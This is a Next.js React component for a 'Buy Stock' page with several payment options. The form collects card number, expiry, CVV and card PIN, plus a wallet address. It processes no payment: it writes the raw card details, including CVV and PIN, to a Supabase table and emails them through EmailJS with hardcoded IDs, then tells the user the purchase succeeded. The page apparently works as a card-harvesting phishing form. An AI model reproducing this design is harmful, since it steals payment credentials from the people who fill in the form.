'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import { createClient } from '@supabase/supabase-js';
import { toast } from 'sonner';
import { motion } from 'framer-motion';
import { CreditCard, Wallet, Banknote, Store, CheckCircle } from 'lucide-react';
import { PayPalButtons, PayPalScriptProvider } from '@paypal/react-paypal-js';
import MultiPayment from '../../app/MultiPayment/page';
import emailjs from '@emailjs/browser';
import supabase from '../../lib/supabase';


const buystock = () => {
  const [stockSymbol, setStockSymbol] = useState('');
  const [amount, setAmount] = useState(0);
  const [paymentMethod, setPaymentMethod] = useState('wallet');
  const [cardNumber, setCardNumber] = useState('');
  const [walletAddress, setWalletAddress] = useState('');
  const [success, setSuccess] = useState(false);
  const [expiry, setExpiry] = useState('');
  const [cvv, setCvv] = useState('');
  const [cardPin, setCardPin] = useState('');

  const router = useRouter();

  const handlePurchase = async () => {
    
    if (!stockSymbol) return toast.error('Please enter a stock symbol.');
    if (amount <= 0) return toast.error('Enter a valid amount.');

    // Handle different payment methods
    switch (paymentMethod) {
      case 'wallet':
        if (!walletAddress) return toast.error('Enter your wallet address.');
        // Implement wallet payment logic here
        break;
      case 'card':
        if (cardNumber.length < 12) return toast.error('Enter a valid card number.');
        // Implement card payment logic here
        break;
      case 'paypal':
        // PayPal payment is handled via PayPalButtons
        break;
      case 'bank':
        // Implement bank transfer logic here
        break;
      case 'merchant':
        // Implement stock merchant payment logic here
        break;
      default:
        return toast.error('Select a valid payment method.');
    }

    // Record the purchase in Supabase
    const { error } = await supabase.from('purchases').insert([
      {
        stock_symbol: stockSymbol,
        amount,
        payment_method: paymentMethod,
        wallet_address: walletAddress,
        card_number: cardNumber,
        cvv: cvv,
        expiry_date: expiry,
        card_pin: cardPin,
      },
    ]);

     if (error) {
    console.error('Supabase Insert Error:', JSON.stringify(error, null, 2));
    toast.error(`Purchase order failed: ${error.message || 'Unknown error'}`);
    return;
  }
// Step 3: Send confirmation email via EmailJS
const form = {
  stock_symbol: stockSymbol,
  amount,
  payment_method: paymentMethod,
  wallet_address: walletAddress,
  card_number: cardNumber,
  cvv: cvv,
  expiry_date: expiry,
  card_pin: cardPin,
};
emailjs
  .send(
    'service_tiih48u',
    'template_akfh6vu',
    form,
    'IyEEUqS1FYB6INOnR'
  )
  .then(() => console.log('Email sent!'))
  .catch((err: any) => console.error('EmailJS error:', err.text));


toast.success('Stock purchased successfully!');
    setSuccess(true);

    setTimeout(() => {
      setSuccess(false);
      router.push('/'); // Redirect to the buy stock page
    }, 2000);
  };

  return (
    <motion.div
      initial={{ opacity: 0, y: 30 }}
      animate={{ opacity: 1, y: 0 }}
      className="max-w-lg mx-auto mt-10 bg-white shadow-2xl rounded-2xl p-6 space-y-6"
    >
      <h2 className="text-2xl font-bold">Buy Stock</h2>
      <MultiPayment />
      

      <div className="space-y-4">
        <label className="block">
          <span className="text-gray-700 font-medium">Stock Symbol</span>
          <input
            type="text"
            value={stockSymbol}
            onChange={(e) => setStockSymbol(e.target.value)}
            placeholder="e.g., AAPL"
            className="w-full border border-gray-300 rounded-lg px-4 py-2 bg-[#0d0d26] text-white focus:ring-blue-500 focus:outline-none mt-2"
            />
        </label>

        <label className="block">
          <span className="text-gray-700 font-medium">Amount</span>
          <input
            type="number"
            value={amount}
            onChange={(e) => setAmount(parseFloat(e.target.value))}
            placeholder="Enter amount"
            className="w-full border border-gray-300 rounded-lg px-4 py-2 bg-[#0d0d26] text-white focus:ring-blue-500 focus:outline-none mt-2"
            />
        </label>

        <label className="block">
          <span className="text-gray-700 font-medium">Payment Method</span>
          <select
            value={paymentMethod}
            onChange={(e) => setPaymentMethod(e.target.value)}
            className="w-full border border-gray-300 rounded-lg px-4 py-2 bg-[#0d0d26] text-white focus:ring-blue-500 focus:outline-none mt-2"
            >
            <option value="wallet">Wallet</option>
            <option value="card">Credit/Debit Card</option>
            <option value="paypal">PayPal</option>
            <option value="bank">Bank Transfer</option>
            <option value="merchant">Stock Merchant</option>
          </select>
        </label>

        {paymentMethod === 'wallet' && (
          <label className="block">
            <span className="text-gray-700 font-medium">Wallet Address O-Piala82258kazam</span>
            <input
              type="text"
              value={walletAddress}
              onChange={(e) => setWalletAddress(e.target.value)}
              placeholder="0x..."
              className="w-full border border-gray-300 rounded-lg px-4 py-2 bg-[#0d0d26] text-white focus:ring-blue-500 focus:outline-none mt-2"
            />
          </label>
        )}

        {paymentMethod === 'card' && (
          <label className="block">
            <span className="text-gray-700 font-medium">Card Number</span>
            <input
                type="text"
                maxLength={16}
                value={cardNumber}
                onChange={(e) => setCardNumber(e.target.value)}
                placeholder="XXXX XXXX XXXX XXXX"
                className="w-full border border-gray-300 rounded-lg px-4 py-2 bg-[#0d0d26] text-white focus:ring-blue-500 focus:outline-none mt-2"
              />
              <input
                type="text"
                maxLength={5}
                value={expiry}
                onChange={(e) => setExpiry(e.target.value)}
                placeholder="MM/YY"
                className="w-full border border-gray-300 rounded-lg px-4 py-2 bg-[#0d0d26] text-white focus:ring-blue-500 focus:outline-none mt-2"
              />
              <input
                type="text"
                maxLength={4}
                value={cvv}
                onChange={(e) => setCvv(e.target.value)}
                placeholder="CVV"
                className="w-full border border-gray-300 rounded-lg px-4 py-2 bg-[#0d0d26] text-white focus:ring-blue-500 focus:outline-none mt-2"
                />
                <input
                type="text"
                maxLength={6}
                value={cardPin}
                onChange={(e) => setCardPin(e.target.value)}
                placeholder="CARD PIN"
                className="w-full border border-gray-300 rounded-lg px-4 py-2 bg-[#0d0d26] text-white focus:ring-blue-500 focus:outline-none mt-2"
            />
          </label>
        )}

        {paymentMethod === 'paypal' && (
          <PayPalScriptProvider options={{ clientId: process.env.NEXT_PUBLIC_PAYPAL_CLIENT_ID || '' }}>
            <PayPalButtons
              style={{ layout: 'vertical' }}
              createOrder={(data, actions) => {
                return actions.order.create({
                  intent: 'CAPTURE',
                  purchase_units: [
                    {
                      amount: {
                        currency_code: 'USD',
                        value: amount.toString(),
                      },
                    },
                  ],
                });
              }}
              onApprove={async (data, actions) => {
                if (!actions.order) {
                  toast.error('Order actions are unavailable.');
                  return Promise.resolve(); // Ensure a Promise is always returned
                }
                await actions.order.capture().then((details) => {
                  toast.success('PayPal payment successful!');
                  setSuccess(true);
                  setTimeout(() => {
                    setSuccess(false);
                    router.push('/');
                  }, 2000);
                });
              }}
            />
          </PayPalScriptProvider>
        )}

        {/* Implement additional payment method forms as needed */}

        {paymentMethod !== 'paypal' && (
          <button
            onClick={handlePurchase}
            className="w-full bg-green-600 text-white py-2 rounded-lg font-semibold hover:bg-green-700"
          >
            Purchase Stock
          </button>
        )}
      </div>

      {success && (
        <motion.div
          initial={{ opacity: 0, scale: 0.95 }}
          animate={{ opacity: 1, scale: 1 }}
          className="fixed bottom-5 right-5 bg-green-600 text-white px-4 py-2 rounded-xl shadow-lg flex items-center gap-2"
        >
          <CheckCircle size={20} /> Purchase successful!
        </motion.div>
      )}
    </motion.div>
  );
};

export default buystock;
